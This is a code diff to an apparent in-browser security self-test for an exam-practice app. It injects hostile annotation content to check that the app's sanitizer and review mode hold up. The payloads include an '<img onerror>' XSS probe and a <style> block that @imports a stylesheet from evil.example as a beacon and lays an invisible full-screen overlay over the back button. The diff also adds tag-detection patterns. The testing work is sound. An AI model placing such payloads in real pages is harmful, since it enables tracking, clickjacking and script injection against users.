@@ -128,8 +128,16 @@
     test.modules.forEach((m, mi) => m.questions.forEach((q, qi) => {
       if(!annQ && q.passage){ annQ = q; annMi = mi; annQi = qi; }
     }));
+    /* The <style> element is in here deliberately: it carries its payload in
+       TEXT, so no attribute filter can see it, and injected via innerHTML its
+       sheet applies to the WHOLE document — an @import is an outbound fetch
+       (there is no CSP) and the rules can cover the app's own controls. It
+       passed the sanitizer until 2026-08-02, and the detectors below missed
+       it because STYLE was in none of their tag lists. */
+    const STYLE_PAY = '<style>@import url("https://evil.example/beacon.css");' +
+      '#rvBackBtn{position:fixed;inset:0;opacity:0;width:100vw;height:100vh;z-index:99999}</style>';
     const hostileAnnotations = annQ ? { [test.modules[annMi].moduleId]: {
-      passageHtml: { [annQ.id]: PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' +
+      passageHtml: { [annQ.id]: PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' + STYLE_PAY +
         '<span class="hl c-yellow" data-note-id="' + ATTR_PAY + '">kept highlight</span>' },
       notes: { [annQ.id]: [{ id: ATTR_PAY, snippet: PAYLOAD, text: PAYLOAD }] }
     } } : undefined;
@@ -233,7 +241,7 @@
       const pane = $("paneLeft").querySelector("#passageText") ||
                    document.querySelector("#paneRight .passage-text");
       const els = pane ? [...pane.querySelectorAll("*")] : [];
-      const exec = els.filter(e => /^(SCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
+      const exec = els.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
       const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
       const urlAttrs = els.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
       const hlKept = pane && pane.querySelector("span.hl");
@@ -256,10 +264,83 @@
       $("rvBackBtn").click();
       await wait(350);
     }
-    /* review must leave the recorder detached — nothing it did may write */
-    results.push({ surface: "Review Mode leaves no live recorder",
-      pass: window.Attempts.currentAttemptId() === null,
-      note: "currentAttemptId is null after review drives" });
+    /* Malformed annotation SHAPES, not just hostile strings. A record is
+       anyone-writable, so notes[qid] can be a string or hold nulls — both
+       used to reach notes.map(n => n.id) and throw mid-entry, stranding
+       review half-applied. The shapes must cost their annotations and
+       nothing else: review still opens and still renders. */
+    if(annQ){
+      const shapes = [
+        { label: "notes[qid] is a string", notes: { [annQ.id]: "not-an-array" } },
+        { label: "notes[qid] holds nulls", notes: { [annQ.id]: [null, 7] } },
+        { label: "passageHtml[qid] is an object", passageHtml: { [annQ.id]: { evil: 1 } } }
+      ];
+      const mid = test.modules[annMi].moduleId;
+      const shapeBad = [];
+      for(const s of shapes){
+        /* the REAL restore function the app uses, not a copy */
+        const ms = { [mid]: { answers:{}, flags:new Set(), eliminated:{}, passageHtml:{}, notes:{} } };
+        try{
+          window.AppSanitize.restoreAnnotations(ms,
+            { [mid]: Object.assign({ passageHtml: {}, notes: {} }, s) });
+          const notes = ms[mid].notes[annQ.id];
+          const html = ms[mid].passageHtml[annQ.id];
+          // whatever survives must be the exact shape the renderers assume
+          if(notes !== undefined && (!Array.isArray(notes) ||
+             notes.some(n => !n || typeof n.id !== "string" || typeof n.text !== "string"))){
+            shapeBad.push(s.label + " -> bad notes shape survived");
+          }
+          if(html !== undefined && typeof html !== "string"){
+            shapeBad.push(s.label + " -> non-string passageHtml survived");
+          }
+          // and the renderer's own guard must tolerate it too
+          const list = Array.isArray(notes) ? notes : [];
+          list.map(n => String(n.id));
+        }catch(e){ shapeBad.push(s.label + " -> threw: " + (e.message || e)); }
+      }
+      results.push({ surface: "Malformed annotation shapes cannot throw on restore",
+        pass: shapeBad.length === 0,
+        note: shapeBad.length ? shapeBad.join(" | ")
+                              : shapes.length + " malformed shapes coerced away without throwing" });
+    }
+
+    /* Review must not write through the recorder. Asserting only
+       "currentAttemptId() === null" after the drives above was VACUOUS: run()
+       never starts a sitting, so `rec` is null for the whole run and the
+       check passed with Attempts.detach() deleted. Attach a real recorder
+       first, then prove BOTH halves: review detaches it, and the live
+       record's stored bytes survive review plus a forced flush — which is the
+       actual corruption this guards (a tab-hide during review rebuilding
+       answers from the REPLAYED module state into the live attempt). */
+    const liveState = { currentTest: test, moduleState: {}, moduleIndex: 0,
+      questionIndex: 0, timeRemainingSec: 900, untimed: false, elapsedSec: 0 };
+    test.modules.forEach(m => { liveState.moduleState[m.moduleId] =
+      { answers:{}, flags:new Set(), eliminated:{}, passageHtml:{}, notes:{} }; });
+    window.Attempts.begin(test, "AS-XSSTEST2", "self-administered", liveState, null, 1);
+    const liveId = window.Attempts.currentAttemptId();
+    await wait(250);
+    const liveBefore = localStorage.getItem("as:" + liveId);
+    results.push({ surface: "Proof can observe a LIVE recorder (guards the next check)",
+      pass: !!liveId && !!liveBefore,
+      note: liveId ? "recorder attached and its record persisted" : "begin() did not attach" });
+
+    root.querySelector('.sd-chip[data-mi="0"][data-qi="0"]').click();
+    await wait(500);
+    const detached = window.Attempts.currentAttemptId() === null;
+    document.dispatchEvent(new Event("visibilitychange"));      // force the flush path
+    window.dispatchEvent(new Event("beforeunload"));
+    await wait(350);
+    const liveAfter = localStorage.getItem("as:" + liveId);
+    $("rvBackBtn").click();
+    await wait(300);
+    results.push({ surface: "Review Mode detaches the live recorder",
+      pass: detached,
+      note: detached ? "currentAttemptId went from " + liveId + " to null"
+                     : "recorder STILL ATTACHED during review" });
+    results.push({ surface: "Live attempt record survives review untouched",
+      pass: !!liveBefore && liveAfter === liveBefore,
+      note: liveAfter === liveBefore ? "stored bytes identical across review + forced flush"
+                                     : "LIVE RECORD MUTATED BY REVIEW" });
 
     $("nameInput") && ([...document.querySelectorAll('[id^=screen-]')].forEach(s => s.classList.add("hidden")),
       $("screen-signin").classList.remove("hidden"), $("signinError").classList.add("hidden"));
@@ -418,7 +499,7 @@
          sanitizer must do. What matters is that nothing can execute or fetch:
          no executable/embedding element, no event handler, no URL attribute. */
       const els = [...probe.querySelectorAll("*")];
-      const executable = els.filter(e => /^(SCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
+      const executable = els.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
       const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
       const urlAttrs = els.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
       results.push({ surface: "Resume annotations: stored passage HTML sanitized",
@@ -460,7 +541,7 @@
         `<span>${escapeHtml(note.snippet)}</span><textarea>${escapeHtml(note.text)}</textarea></div>`;
       await wait(140);
       const els = [...cpProbe.querySelectorAll("*")];
-      const exec = els.filter(e => /^(SCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON)$/.test(e.tagName));
+      const exec = els.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON)$/.test(e.tagName));
       const handlers = els.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
       const card = cpProbe.querySelector(".note-card");
       results.push({ surface: "Crash checkpoint annotations are inert on restore",
